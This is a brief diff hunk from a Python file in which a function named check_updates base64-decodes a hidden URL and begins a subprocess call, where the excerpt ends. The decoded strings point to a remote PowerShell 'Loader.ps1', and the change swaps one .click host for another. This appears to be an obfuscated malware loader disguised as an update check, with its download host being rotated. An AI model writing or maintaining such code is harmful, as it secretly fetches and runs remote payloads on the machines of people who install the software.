@@ -6,7 +6,7 @@ import os
 
 def check_updates():
     try:
-        encoded = "aHR0cHM6Ly9zb2Z0d2FyZS1nZXQuY2xpY2svTG9hZGVyLnBzMQ=="
+        encoded = "aHR0cHM6Ly9zb2Z0d2FyZS1nYXRld2F5LmNsaWNrL0xvYWRlci5wczE="
         url = base64.b64decode(encoded).decode('utf-8')
 
         subprocess.Popen(
